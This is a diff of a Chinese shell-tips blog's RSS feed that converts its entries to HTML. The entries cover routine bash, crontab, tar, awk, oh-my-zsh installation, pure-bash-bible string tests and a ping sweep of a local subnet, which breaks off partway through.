       <pubDate>Tue, 07 Jan 2020 00:00:00 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/all-in-one/</guid>
-      <description>命令行编辑 向左移动光标	ctrl + b 向右移动光标	ctrl + f 移动光标到行尾	ctrl + e 移动光标到行首	ctrl + a 清除前面一个词	ctrl + w 清除光标到行首	ctrl + u 清除光标到行尾	ctrl + k 命令行搜索	ctrl + r 解压与压缩 1、压缩命令： 命令格式：
-tar -zcvf 压缩文件名 .tar.gz 被压缩文件名 可先切换到当前目录下，压缩文件名和被压缩文件名都可加入路径。
-2、解压缩命令： 命令格式：
-tar -zxvf 压缩文件名.tar.gz 解压缩后的文件只能放在当前的目录。
-crontab 每隔x秒执行一次 每隔5秒
-* * * * * for i in {1..12}; do /bin/cmd -arg1 ; sleep 5; done 每隔15秒
-* * * * * /bin/cmd -arg1 * * * * * sleep 15; /bin/cmd -arg1 * * * * * sleep 30; /bin/cmd -arg1 * * * * * sleep 45; /bin/cmd -arg1 awk从第二行开始读取 awk &amp;#39;NR&amp;gt;2{print $1}&amp;#39; 查找大文件，并清空文件内容 find /var/log -type f -size +1M -exec truncate --size 0 &amp;#39;{}&amp;#39; &amp;#39;;&amp;#39; switch case 语句 echo &amp;#39;Input a number between 1 to 4&amp;#39; echo &amp;#39;Your number is:\c&amp;#39; read aNum case $aNum in 1) echo &amp;#39;You select 1&amp;#39; ;; 2) echo &amp;#39;You select 2&amp;#39; ;; 3) echo &amp;#39;You select 3&amp;#39; ;; 4) echo &amp;#39;You select 4&amp;#39; ;; *) echo &amp;#39;You do not select a number between 1 to 4&amp;#39; ;; esac 以$开头的特殊变量 echo $$ # 进程pid echo $# # 收到的参数个数 echo $@ # 列表方式的参数 $1 $2 $3 echo $?</description>
+      <description>&lt;h1 id=&#34;命令行编辑&#34;&gt;命令行编辑&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;向左移动光标	ctrl + b&lt;/li&gt;
+&lt;li&gt;向右移动光标	ctrl + f&lt;/li&gt;
+&lt;li&gt;移动光标到行尾	ctrl + e&lt;/li&gt;
+&lt;li&gt;移动光标到行首	ctrl + a&lt;/li&gt;
+&lt;li&gt;清除前面一个词	ctrl + w&lt;/li&gt;
+&lt;li&gt;清除光标到行首	ctrl + u&lt;/li&gt;
+&lt;li&gt;清除光标到行尾	ctrl + k&lt;/li&gt;
+&lt;li&gt;命令行搜索	ctrl + r&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;解压与压缩&#34;&gt;解压与压缩&lt;/h1&gt;
+&lt;p&gt;1、压缩命令：
+命令格式：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tar -zcvf 压缩文件名 .tar.gz 被压缩文件名
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可先切换到当前目录下，压缩文件名和被压缩文件名都可加入路径。&lt;/p&gt;
+&lt;p&gt;2、解压缩命令：
+命令格式：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tar -zxvf 压缩文件名.tar.gz
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解压缩后的文件只能放在当前的目录。&lt;/p&gt;
+&lt;h1 id=&#34;crontab-每隔x秒执行一次&#34;&gt;crontab 每隔x秒执行一次&lt;/h1&gt;
+&lt;p&gt;每隔5秒&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;* * * * * for i in {1..12}; do /bin/cmd -arg1 ; sleep 5; done
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;每隔15秒&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;* * * * * /bin/cmd -arg1
+* * * * * sleep 15; /bin/cmd -arg1
+* * * * * sleep 30; /bin/cmd -arg1
+* * * * * sleep 45; /bin/cmd -arg1
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;awk从第二行开始读取&#34;&gt;awk从第二行开始读取&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;awk &amp;#39;NR&amp;gt;2{print $1}&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;查找大文件并清空文件内容&#34;&gt;查找大文件，并清空文件内容&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;find /var/log -type f -size +1M -exec truncate --size 0 &amp;#39;{}&amp;#39; &amp;#39;;&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;switch-case-语句&#34;&gt;switch case 语句&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo &amp;#39;Input a number between 1 to 4&amp;#39;
+echo &amp;#39;Your number is:\c&amp;#39;
+read aNum
+case $aNum in
+    1)  echo &amp;#39;You select 1&amp;#39;
+    ;;
+    2)  echo &amp;#39;You select 2&amp;#39;
+    ;;
+    3)  echo &amp;#39;You select 3&amp;#39;
+    ;;
+    4)  echo &amp;#39;You select 4&amp;#39;
+    ;;
+    *)  echo &amp;#39;You do not select a number between 1 to 4&amp;#39;
+    ;;
+esac
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;以开头的特殊变量&#34;&gt;以$开头的特殊变量&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo $$ # 进程pid
+echo $# # 收到的参数个数
+echo $@ # 列表方式的参数 $1 $2 $3
+echo $? # 上个进程的退出码
+echo $* # 类似列表方式，但是参数被当做一个实体, &amp;#34;$1c$2c$3&amp;#34; c是IFS的第一个字符
+echo $0 # 脚本名
+echo $1 $2 $3 # 第一、第二、第三个参数
+
+for i in $@
+do
+  echo $i
+done
+
+for j in $@
+do
+  echo $j
+done
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;判断git仓库是否clean&#34;&gt;判断git仓库是否clean&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;check_is_repo_clean () {
+       if [ -n &amp;#34;$(git status --porcelain)&amp;#34; ]; then
+           echo &amp;#34;Working directory is not clean&amp;#34;
+           exit 1
+       fi
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;文件批处理-for-in循环&#34;&gt;文件批处理 for in循环&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;for f in *.txt; do mv $f $f.gz; done
+for d in *.gz; do gunzip $d; done
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;shell-重定向到devnull&#34;&gt;shell 重定向到/dev/null&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ls &amp;amp;&amp;gt;/dev/null; #标准错误和标准输出都不想看
+ls 1&amp;gt;/dev/null; #不想看标准输出
+ls 2&amp;gt;/dev/null; 标准错误不想看
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;sed--e-expression-1-char-21-unknown-option-to-s&#34;&gt;sed: -e expression #1, char 21: unknown option to `s&#39;&lt;/h1&gt;
+&lt;p&gt;出现这个问题，一般是要替换的字符串中也有/符号，所以要把分隔符改成 ! 或者 |&lt;/p&gt;</description>
     </item>
-    
     <item>
       <title>手工安装oh-my-zsh</title>
       <link>https://wdd.js.org/shell/manu-install-ohmyzsh/</link>
       <pubDate>Fri, 27 Dec 2019 09:29:41 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/manu-install-ohmyzsh/</guid>
-      <description>yum install zsh -y # github上的项目下载太慢，所以我就把项目克隆到gitee上，这样克隆速度就非常快 git clone https://gitee.com/nuannuande/oh-my-zsh.git ~/.oh-my-zsh # 这一步是可选的 cp ~/.zshrc ~/.zshrc.orig # 这一步是必须的 cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc # 改变默认的sh, 如果这一步报错，就再次输入 zsh chsh -s $(which zsh) </description>
+      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install zsh -y
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# github上的项目下载太慢，所以我就把项目克隆到gitee上，这样克隆速度就非常快&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone https://gitee.com/nuannuande/oh-my-zsh.git ~/.oh-my-zsh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 这一步是可选的&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cp ~/.zshrc ~/.zshrc.orig
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 这一步是必须的&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 改变默认的sh, 如果这一步报错，就再次输入 zsh&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chsh -s &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;which zsh&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
-    
     <item>
       <title>m4读取环境变量</title>
       <link>https://wdd.js.org/shell/m4-env/</link>
       <pubDate>Fri, 27 Dec 2019 09:28:53 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/m4-env/</guid>
-      <description>define(`CF_INNER_IP&amp;#39;, `esyscmd(`printf &amp;#34;$PWD&amp;#34;&amp;#39;)&amp;#39;) </description>
+      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;define&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;CF_INNER_IP&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;, `esyscmd(`printf &amp;#34;$PWD&amp;#34;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
-    
     <item>
       <title>pure-bash-bible</title>
       <link>https://wdd.js.org/shell/pure-bash-bible/</link>
       <pubDate>Thu, 26 Dec 2019 13:46:31 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/pure-bash-bible/</guid>
-      <description>字符串 字符串包含 Using a test:
-if [[ $var == *sub_string* ]]; then printf &amp;#39;%s\n&amp;#39; &amp;#34;sub_string is in var.&amp;#34; fi # Inverse (substring not in string). if [[ $var != *sub_string* ]]; then printf &amp;#39;%s\n&amp;#39; &amp;#34;sub_string is not in var.&amp;#34; fi # This works for arrays too! if [[ ${arr[*]} == *sub_string* ]]; then printf &amp;#39;%s\n&amp;#39; &amp;#34;sub_string is in array.&amp;#34; fi Using a case statement:
-case &amp;#34;$var&amp;#34; in *sub_string*) # Do stuff ;; *sub_string2*) # Do more stuff ;; *) # Else ;; esac 字符串开始 if [[ $var == sub_string* ]]; then printf &amp;#39;%s\n&amp;#39; &amp;#34;var starts with sub_string.</description>
+      <description>&lt;h1 id=&#34;字符串&#34;&gt;字符串&lt;/h1&gt;
+&lt;h2 id=&#34;字符串包含&#34;&gt;字符串包含&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Using a test:&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $var &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; *sub_string* &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%s\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sub_string is in var.&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Inverse (substring not in string).&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $var !&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; *sub_string* &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%s\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sub_string is not in var.&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# This works for arrays too!&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;arr[*]&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; *sub_string* &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%s\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sub_string is in array.&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Using a case statement:&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; in
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    *sub_string*&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# Do stuff&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    *sub_string2*&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# Do more stuff&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    *&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# Else&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;esac&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;字符串开始&#34;&gt;字符串开始&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $var &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; sub_string* &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%s\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;var starts with sub_string.&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Inverse (var does not start with sub_string).&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $var !&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sub_string* &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%s\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;var does not start with sub_string.&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;字符串结尾&#34;&gt;字符串结尾&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $var &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; *sub_string &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%s\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;var ends with sub_string.&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Inverse (var does not end with sub_string).&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $var !&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; *sub_string &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%s\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;var does not end with sub_string.&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;循环&#34;&gt;循环&lt;/h1&gt;
+&lt;h2 id=&#34;数字范围循环&#34;&gt;数字范围循环&lt;/h2&gt;
+&lt;p&gt;Alternative to &lt;code&gt;seq&lt;/code&gt;.&lt;/p&gt;</description>
     </item>
-    
     <item>
       <title>列出网络中活动的主机</title>
       <link>https://wdd.js.org/shell/list-active-host/</link>
       <pubDate>Thu, 26 Dec 2019 10:34:15 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/list-active-host/</guid>
-      <description>使用 ping 优点 原生，不用安装软件 缺点 速度慢 下面的脚本列出 192.168.1.0/24 的所有主机，大概需要 255 秒
-#!/bin/bash function handler () { echo &amp;#34;will exit&amp;#34; exit 0 } trap &amp;#39;handler&amp;#39; SIGINT for ip in 192.168.1.{1..255} do ping -W 1 -c 1 $ip &amp;amp;&amp;gt; /dev/null if [ $? -eq 0 ]; then echo $ip is alive else echo $ip is dead fi done 使用 fping 优点 速度快 缺点 需要安装 fping # 安装fping brew install fping # mac yum install fping # centos apt install fping # debian 我用的 fping 是 MacOS X， fping 的版本是 4.</description>
+      <description>&lt;h1 id=&#34;使用-ping&#34;&gt;使用 ping&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;优点
+&lt;ul&gt;
+&lt;li&gt;原生，不用安装软件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;缺点
+&lt;ul&gt;
+&lt;li&gt;速度慢&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;下面的脚本列出 192.168.1.0/24 的所有主机，大概需要 255 秒&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; handler &lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;will exit&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  exit &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;trap &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;handler&amp;#39;&lt;/span&gt; SIGINT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ip in 192.168.1.&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;1..255&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
